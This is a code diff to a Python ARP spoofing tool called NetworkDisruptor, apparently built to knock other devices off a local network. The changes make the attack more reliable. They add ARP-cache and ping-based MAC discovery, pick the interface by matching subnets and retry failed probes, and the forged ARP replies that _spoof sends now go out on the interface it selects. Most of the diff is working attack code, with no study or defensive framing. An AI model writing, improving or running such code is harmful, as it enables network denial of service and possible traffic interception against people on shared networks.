@@ -7,7 +7,10 @@ Unauthorized use may violate laws. Use at your own risk.
 import time
 import threading
 import logging
-from scapy.all import ARP, Ether, send, srp, conf
+import re
+import subprocess
+import ipaddress
+from scapy.all import ARP, Ether, send, srp, conf, get_if_list
 import netifaces
 
 # Configure logging
@@ -48,37 +51,134 @@ class NetworkDisruptor:
         except Exception as e:
             return False, f"Error: {str(e)}"
     
-    def _get_mac(self, ip):
-        """Get MAC address for given IP"""
+    def _get_mac_from_arp_cache(self, ip):
+        """Check the OS ARP cache for a MAC address (fast, no packet needed)"""
         try:
-            arp_request = ARP(pdst=ip)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_request_broadcast = broadcast / arp_request
-            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
-            
-            if answered_list:
-                return answered_list[0][1].hwsrc
-            return None
+            output = subprocess.check_output(
+                ["arp", "-a", ip], stderr=subprocess.DEVNULL, timeout=3
+            ).decode(errors="ignore")
+            # Windows arp -a output: "  192.168.1.1     aa-bb-cc-dd-ee-ff     dynamic"
+            match = re.search(
+                r"([0-9a-f]{2}[:\-][0-9a-f]{2}[:\-][0-9a-f]{2}[:\-]"
+                r"[0-9a-f]{2}[:\-][0-9a-f]{2}[:\-][0-9a-f]{2})",
+                output, re.IGNORECASE
+            )
+            if match:
+                mac = match.group(1).replace("-", ":")
+                logger.info(f"ARP cache hit for {ip}: {mac}")
+                return mac
         except Exception as e:
-            print(f"Error getting MAC for {ip}: {e}")
-            return None
+            logger.debug(f"ARP cache lookup failed for {ip}: {e}")
+        return None
+
+    def _find_interface_for_ip(self, ip):
+        """
+        Find the correct local network interface to reach 'ip' by matching
+        the IP against each interface's subnet. Falls back to conf.route.route().
+        This avoids Scapy picking a VPN/Hyper-V virtual adapter by mistake.
+        """
+        try:
+            target = ipaddress.ip_address(ip)
+            for iface in netifaces.interfaces():
+                addrs = netifaces.ifaddresses(iface)
+                if netifaces.AF_INET not in addrs:
+                    continue
+                for addr_info in addrs[netifaces.AF_INET]:
+                    local_ip = addr_info.get("addr", "")
+                    netmask = addr_info.get("netmask", "")
+                    if not local_ip or not netmask:
+                        continue
+                    try:
+                        network = ipaddress.ip_network(
+                            f"{local_ip}/{netmask}", strict=False
+                        )
+                        if target in network:
+                            logger.info(
+                                f"Subnet match: {ip} is on {network} via {iface}"
+                            )
+                            return iface
+                    except ValueError:
+                        continue
+        except Exception as e:
+            logger.warning(f"Interface detection error for {ip}: {e}")
+
+        # Fallback: trust Scapy's routing table
+        try:
+            iface, _, _ = conf.route.route(ip)
+            logger.info(f"Routing table fallback: {ip} -> {iface}")
+            return iface
+        except Exception as e:
+            logger.error(f"conf.route.route failed for {ip}: {e}")
+            return conf.iface
+
+    def _get_mac(self, ip, timeout=3, retries=3):
+        """Get MAC address for given IP — checks OS cache first, then live ARP probe"""
+        # Step 1: Try the OS ARP cache (instant, no packet needed, always uses right iface)
+        cached_mac = self._get_mac_from_arp_cache(ip)
+        if cached_mac:
+            return cached_mac
+
+        # Step 2: Trigger a ping to populate the ARP cache, then try cache again
+        try:
+            subprocess.call(
+                ["ping", "-n", "1", "-w", "500", ip],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2
+            )
+            cached_mac = self._get_mac_from_arp_cache(ip)
+            if cached_mac:
+                return cached_mac
+        except Exception:
+            pass
+
+        # Step 3: Live ARP probe via Scapy, using subnet-matched interface
+        correct_interface = self._find_interface_for_ip(ip)
+        logger.info(f"Live ARP probe for {ip} on interface '{correct_interface}'")
+
+        arp_request = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = broadcast / arp_request
+
+        for attempt in range(1, retries + 1):
+            try:
+                answered, _ = srp(
+                    packet,
+                    timeout=timeout,
+                    verbose=False,
+                    iface=correct_interface
+                )
+                if answered:
+                    return answered[0][1].hwsrc
+                logger.warning(
+                    f"ARP probe attempt {attempt}/{retries} got no reply from {ip}"
+                )
+            except Exception as e:
+                logger.error(f"ARP probe error on attempt {attempt} for {ip}: {e}")
+
+        logger.error(
+            f"Could not resolve MAC for {ip} after {retries} attempts. "
+            f"Interface used: '{correct_interface}'. "
+            "Ensure the target is reachable and on the same subnet."
+        )
+        return None
     
     def _spoof(self, target_ip, target_mac, spoof_ip):
-        """Send fake ARP packet"""
+        """Send fake ARP packet with subnet-matched interface"""
         try:
+            correct_interface = self._find_interface_for_ip(target_ip)
             packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-            send(packet, verbose=False)
+            send(packet, verbose=False, iface=correct_interface)
         except Exception as e:
-            print(f"Spoofing error: {e}")
+            logger.error(f"Spoofing error for {target_ip}: {e}")
     
     def _restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        """Restore normal connection"""
+        """Restore normal connection with subnet-matched interface"""
         try:
-            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
-                        psrc=gateway_ip, hwsrc=gateway_mac)
-            send(packet, count=5, verbose=False)
+            correct_interface = self._find_interface_for_ip(target_ip)
+            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                         psrc=gateway_ip, hwsrc=gateway_mac)
+            send(packet, count=5, verbose=False, iface=correct_interface)
         except Exception as e:
-            print(f"Restore error: {e}")
+            logger.error(f"Restore error for {target_ip}: {e}")
     
     def kick_device(self, target_ip, duration=None):
         """
